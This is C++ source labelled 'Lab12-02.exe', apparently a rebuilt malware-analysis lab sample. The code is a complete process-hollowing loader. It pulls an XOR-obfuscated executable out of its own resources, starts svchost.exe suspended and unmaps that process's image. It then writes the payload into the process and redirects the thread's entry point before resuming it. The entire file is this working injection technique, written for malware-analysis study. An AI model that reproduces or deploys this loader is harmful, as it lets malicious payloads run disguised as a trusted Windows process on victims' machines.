// Lab12-02.exe

#include <Windows.h>
#include <cstdio>
#include <iostream>
#include "..\\resource.h"

#pragma warning ( disable : 4996 )
#pragma warning ( disable : 6385 )
#pragma warning ( disable : 6387 )
#pragma warning ( disable : 6011 )
#pragma warning ( disable : 4302 )

char* _GetSystemDir(const char* fileName, LPSTR currentFile, UINT size);
LPVOID _LoadPayload(HMODULE hModule);
void _Xor(PBYTE data, DWORD dataSize, CHAR key);

void _Injection(LPCSTR appName, LPVOID payload_addr)
{
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	LPCONTEXT context = { 0 };
	int buffer = 0;
	LPVOID remoteAddr = nullptr;
	LPVOID sectionAddr = nullptr;
	LPVOID payloadSectionAddr = nullptr;

	auto* dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(payload_addr);
	if (dosHeader->e_magic == IMAGE_DOS_SIGNATURE)
	{
		auto* ntHeader = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<PBYTE>(payload_addr) + dosHeader->e_lfanew);
		if (ntHeader->Signature == IMAGE_NT_SIGNATURE)
		{
			memset(&si, 0, sizeof(si));
			si.cb = sizeof(si);
			memset(&pi, 0, sizeof(pi));
			if (CreateProcessA(appName, nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi))
			{
				context = reinterpret_cast<LPCONTEXT>(VirtualAlloc(nullptr, sizeof(LPCONTEXT), MEM_COMMIT, PAGE_READWRITE));
				context->ContextFlags = CONTEXT_FULL;
				if (GetThreadContext(pi.hThread, context))
				{
					ReadProcessMemory(pi.hProcess, reinterpret_cast<LPCVOID>(context->Ebx + 8), &buffer, sizeof(buffer), 0);
					auto ptr_NtUnmapViewOfSection = reinterpret_cast<NTSTATUS(WINAPI*)(HANDLE, int)>(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
					if (ptr_NtUnmapViewOfSection)
					{
						ptr_NtUnmapViewOfSection(pi.hProcess, buffer);
						remoteAddr = VirtualAllocEx(
							pi.hProcess,
							reinterpret_cast<LPVOID>(ntHeader->OptionalHeader.ImageBase),
							ntHeader->OptionalHeader.SizeOfImage,
							(MEM_COMMIT | MEM_RESERVE),
							PAGE_EXECUTE_READWRITE
						);
						if (remoteAddr)
						{
							WriteProcessMemory(pi.hProcess, remoteAddr, payload_addr, ntHeader->OptionalHeader.SizeOfHeaders, 0);
							auto* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
							for (unsigned int i = 0; i < ntHeader->FileHeader.NumberOfSections; ++i, ++sectionHeader)
							{
								sectionAddr = reinterpret_cast<LPVOID>(reinterpret_cast<DWORD>(remoteAddr) + sectionHeader->VirtualAddress);
								payloadSectionAddr = reinterpret_cast<LPVOID>(reinterpret_cast<DWORD>(payload_addr) + sectionHeader->PointerToRawData);
								WriteProcessMemory(pi.hProcess, sectionAddr, payloadSectionAddr, sectionHeader->SizeOfRawData, NULL);
							}
							WriteProcessMemory(pi.hProcess, reinterpret_cast<LPVOID>(context->Ebx + 8), &ntHeader->OptionalHeader.ImageBase, sizeof(DWORD), 0);
							context->Eax = reinterpret_cast<DWORD>(remoteAddr) + ntHeader->OptionalHeader.AddressOfEntryPoint;
							SetThreadContext(pi.hThread, context);
							ResumeThread(pi.hThread);
						}
					}
				}
				VirtualFree(context, 0, MEM_RELEASE);
			}
		}
	}
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}


int main(int argc, char** argv[])
{
	HMODULE hMod = nullptr;
	CHAR app_name[1024];
	LPVOID payloadAddr = nullptr;

	if (argc < 2)
	{
		hMod = GetModuleHandleA(NULL);
		_GetSystemDir("\\svchost.exe", app_name, sizeof(app_name));
		// printf_s("File Path: %s\n", app_name);
		payloadAddr = _LoadPayload(hMod);
		if (payloadAddr)
		{
			// printf_s("Payload at 0x%p\n", payloadAddr);
			_Injection(app_name, payloadAddr);
			memset(app_name, 0, sizeof(app_name));
			VirtualFree(payloadAddr, 0, MEM_RELEASE);
		}
	}
	return 0;
}


char* _GetSystemDir(const char* fileName, LPSTR currentFile, UINT size)
{
	SIZE_T x, y = 0;
	GetSystemDirectoryA(currentFile, size);
	// GetSystemWow64DirectoryA(currentFile, size);
	x = size - strlen(currentFile);
	y = strlen(currentFile);
	return strncat(&currentFile[y], fileName, x);
}


LPVOID _LoadPayload(HMODULE hModule)
{
	HRSRC hResInfo = nullptr;
	HGLOBAL hResData = nullptr;
	LPVOID resource = nullptr;
	DWORD resourceSize = 0;
	PBYTE baseAddr = nullptr;

	if (!hModule)
		return 0;

	hResInfo = FindResourceA(hModule, MAKEINTRESOURCEA(IDR_RCDATA1), MAKEINTRESOURCEA(RT_RCDATA));
	if (!hResInfo)
		return 0;

	hResData = LoadResource(hModule, hResInfo);
	if (hResData)
	{
		resource = LockResource(hResData);
		if (resource)
		{
			resourceSize = SizeofResource(hModule, hResInfo);
			if (resourceSize)
			{
				baseAddr = static_cast<PBYTE>(VirtualAlloc(nullptr, resourceSize, MEM_COMMIT, PAGE_READWRITE));
				if (baseAddr)
				{
					memcpy(baseAddr, resource, resourceSize);
					if (*baseAddr != 0x4D || baseAddr[1] != 0x5A)
						_Xor(baseAddr, resourceSize, 0x41);
				}
			}
		}
	}
	FreeResource(hResInfo);
	return baseAddr;
}


void _Xor(PBYTE data, DWORD dataSize, CHAR key)
{
	for (unsigned int i = 0; i < dataSize; ++i)
		*reinterpret_cast<PBYTE>(i + data) ^= key;
}
